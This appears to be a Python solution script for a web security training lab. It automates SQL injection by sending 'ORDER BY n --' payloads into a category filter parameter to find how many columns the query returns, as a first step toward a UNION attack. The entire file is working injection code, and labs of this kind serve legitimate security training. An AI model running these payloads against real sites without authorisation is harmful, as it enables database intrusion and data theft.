# Lab: SQL injection UNION attack, determining the number of columns returned by the query

import requests
import urllib3
import sys
from urllib.parse import quote
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

Proxies = {
    "http" : "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def Request(url, path, query):
    encoded_query = quote(query)
    try:
        r = requests.get(url + path + encoded_query, verify=False, proxies=Proxies, timeout=10 )
    except requests.RequestException:
        return None
    return r

def find_columns(url):
    path = "/filter?category=Accessories"
    i = 1
    while i < 20:
        sql_query = f"' ORDER BY {i} -- "
        encoded_query = quote(sql_query)
        r =  Request(url, path, sql_query)
        if r.status_code != 200:
            i -= 1
            return i
        i += 1
    return None

if __name__=='__main__':
    url = input("Enter your Url: ").strip()
    
    if len(url) == 0:
        print("Enter the url")
        sys.exit(-1)
        
    print(f"[+] Dumping the number of columns")
    
    num_col =find_columns(url)
    print(f"[+] Number of columns: {num_col}")
    if not num_col:
        print("[-] Can't reterive the columns")